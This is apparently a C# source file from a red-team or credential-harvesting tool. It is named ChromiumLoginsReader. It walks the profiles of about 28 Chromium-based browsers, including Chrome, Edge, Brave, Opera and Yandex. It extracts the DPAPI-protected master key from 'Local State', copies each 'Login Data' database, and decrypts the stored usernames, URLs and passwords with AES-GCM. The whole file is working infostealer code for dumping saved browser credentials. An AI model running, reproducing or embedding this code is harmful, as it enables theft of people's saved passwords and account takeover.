using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.IO;
using System.Security.Cryptography;
using System.Data;
using CS_SQLite3;
using System.Security.Principal;
using RedBrowers.Helper;
using System.Collections;

namespace RedBrowers
{
    internal class ChromiumLoginsReader : ILoginsReader
    {
        private static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public string BrowserName => "Chromium Based";

        public List<Login> ReadLogins()
        {
            Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
            {
                {
                    "Chrome",
                    LocalApplicationData + @"\Google\Chrome\User Data"
                },
                {
                    "Opera",
                    Path.Combine(ApplicationData, @"Opera Software\Opera Stable")
                },
                {
                    "Yandex",
                    Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data")
                },
                {
                    "360 Browser",
                    LocalApplicationData + @"\360Chrome\Chrome\User Data"
                },
                {
                    "Comodo Dragon",
                    Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data")
                },
                {
                    "CoolNovo",
                    Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data")
                },
                {
                    "SRWare Iron",
                    Path.Combine(LocalApplicationData, @"Chromium\User Data")
                },
                {
                    "Torch Browser",
                    Path.Combine(LocalApplicationData, @"Torch\User Data")
                },
                {
                    "Brave Browser",
                    Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data")
                },
                {
                    "Iridium Browser",
                    LocalApplicationData + @"\Iridium\User Data"
                },
                {
                    "7Star",
                    Path.Combine(LocalApplicationData, @"7Star\7Star\User Data")
                },
                {
                    "Amigo",
                    Path.Combine(LocalApplicationData, @"Amigo\User Data")
                },
                {
                    "CentBrowser",
                    Path.Combine(LocalApplicationData, @"CentBrowser\User Data")
                },
                {
                    "Chedot",
                    Path.Combine(LocalApplicationData, @"Chedot\User Data")
                },
                {
                    "CocCoc",
                    Path.Combine(LocalApplicationData, @"CocCoc\Browser\User Data")
                },
                {
                    "Elements Browser",
                    Path.Combine(LocalApplicationData, @"Elements Browser\User Data")
                },
                {
                    "Epic Privacy Browser",
                    Path.Combine(LocalApplicationData, @"Epic Privacy Browser\User Data")
                },
                {
                    "Kometa",
                    Path.Combine(LocalApplicationData, @"Kometa\User Data")
                },
                {
                    "Orbitum",
                    Path.Combine(LocalApplicationData, @"Orbitum\User Data")
                },
                {
                    "Sputnik",
                    Path.Combine(LocalApplicationData, @"Sputnik\Sputnik\User Data")
                },
                {
                    "uCozMedia",
                    Path.Combine(LocalApplicationData, @"uCozMedia\Uran\User Data")
                },
                {
                    "Vivaldi",
                    Path.Combine(LocalApplicationData, @"Vivaldi\User Data")
                },
                {
                    "Sleipnir 6",
                    Path.Combine(ApplicationData, @"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
                },
                {
                    "Citrio",
                    Path.Combine(LocalApplicationData, @"CatalinaGroup\Citrio\User Data")
                },
                {
                    "Coowon",
                    Path.Combine(LocalApplicationData, @"Coowon\Coowon\User Data")
                },
                {
                    "Liebao Browser",
                    Path.Combine(LocalApplicationData, @"liebao\User Data")
                },
                {
                    "QIP Surf",
                    Path.Combine(LocalApplicationData, @"QIP Surf\User Data")
                },
                {
                    "Edge Chromium",
                    Path.Combine(LocalApplicationData, @"Microsoft\Edge\User Data")
                }
            };

            var list = new List<Login>();

            foreach (var item in ChromiumPaths)
                list.AddRange(GetLogins(item.Value, item.Key));

            return list;
        }
        private static List<string> GetAllProfiles(string DirectoryPath)
        {
            List<string> loginDataFiles = new List<string>
            {
                DirectoryPath + @"\Default\Login Data",
                DirectoryPath + @"\Login Data"
            };

            if (Directory.Exists(DirectoryPath))
            {
                foreach (string dir in Directory.GetDirectories(DirectoryPath))
                {
                    if (dir.Contains("Profile"))
                        loginDataFiles.Add(dir + @"\Login Data");
                }
            }

            return loginDataFiles;
        }

        private static List<Login> GetLogins(string path,string Browser) 
        {
            List<Login> logins = new List<Login>();

            //Get all created profiles from browser path
            List<string> loginDataFiles = GetAllProfiles(path);


        
  

            foreach (string loginFile in loginDataFiles.ToArray())
            {
                if (!File.Exists(loginFile)) 
                {
                    continue;
                }
                byte[] EncryptedKey = GetEncryptedkey(path).Skip(5).ToArray();
                byte[] MasterKey = ProtectedData.Unprotect(EncryptedKey, null, DataProtectionScope.CurrentUser);


                string loginFilecopy = Utlis.ToTempFile(loginFile);

                SQLiteDatabase database = new SQLiteDatabase(loginFilecopy);
                string query = "SELECT action_url, username_value, password_value FROM logins";
                DataTable resultantQuery = database.ExecuteQuery(query);
                foreach (DataRow row in resultantQuery.Rows)
                {

                    byte[] encryptedPassword = Convert.FromBase64String((string)row["password_value"]);
                    string password = Encoding.UTF8.GetString(encryptedPassword);

                    if (password != null)
                    {
                        if (password.StartsWith("v10") || password.StartsWith("v11"))
                        {
                            password = DecryptPassword(encryptedPassword, MasterKey);
                        }
                        else
                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));
                    }
                    else
                        continue;

                    if (password != null) 
                    {
                        logins.Add(new Login(row["action_url"].ToString(), row["username_value"].ToString(), password,Browser));

                    }
                }


                database.CloseDatabase();
                File.Delete(loginFilecopy);
            }

            return logins;
        }
     
        private static string DecryptPassword(byte[] EncryptedPassword, byte[] MasterKey)
        {

            byte[] IV = EncryptedPassword.Skip(3).Take(12).ToArray();

            byte[] Ciphertext = EncryptedPassword.Skip(15).Take(EncryptedPassword.Length - 31).ToArray();

            byte[] Tag = EncryptedPassword.Skip(EncryptedPassword.Length - 16).Take(16).ToArray();

           return Encoding.Default.GetString(AesGcm.Decrypt(MasterKey, IV, null, Ciphertext, Tag));
        }
        private static byte[] GetEncryptedkey(string path)
        {
            string Content = File.ReadAllText(Path.Combine(path, "Local State"));
            Match match = Regex.Match(Content, @"""encrypted_key"":""(.*?)""");
            if (match.Success)
            {
                return Convert.FromBase64String(match.Groups[1].Value);
            }
            else 
            {
                throw new Exception("Cannot Get encrypted_key");
            }
        }

 
    }
}
